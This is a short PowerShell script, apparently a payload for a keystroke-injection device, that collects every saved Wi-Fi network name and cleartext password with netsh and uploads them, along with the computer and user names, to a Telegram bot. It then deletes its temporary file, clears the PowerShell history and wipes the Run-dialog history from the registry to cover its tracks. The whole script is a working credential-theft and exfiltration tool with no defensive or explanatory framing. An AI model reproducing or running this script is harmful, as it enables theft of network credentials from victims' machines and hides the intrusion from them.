$tk=$env:TK
$ci=$env:CI
$f="$env:TEMP\~tmp$(Get-Random).txt"

netsh wlan show profiles|Select-String 'All User Profile'|%{
    $n=($_ -split ':')[1].Trim()
    $p=(netsh wlan show profile name=$n key=clear|Select-String 'Key Content')
    if($p){"$n : "+(($p -split ':')[1].Trim())}
}|Out-File $f -Encoding UTF8

$h="[r00t_b0t] $env:COMPUTERNAME | $env:USERNAME`n"+(Get-Content $f -Raw)
$h|Out-File $f -Encoding UTF8

curl.exe -s -X POST https://api.telegram.org/bot$tk/sendDocument -F chat_id=$ci -F document=@$f

# Remove all traces
Remove-Item $f -Force -ErrorAction SilentlyContinue
Clear-History -ErrorAction SilentlyContinue
[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()
Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue
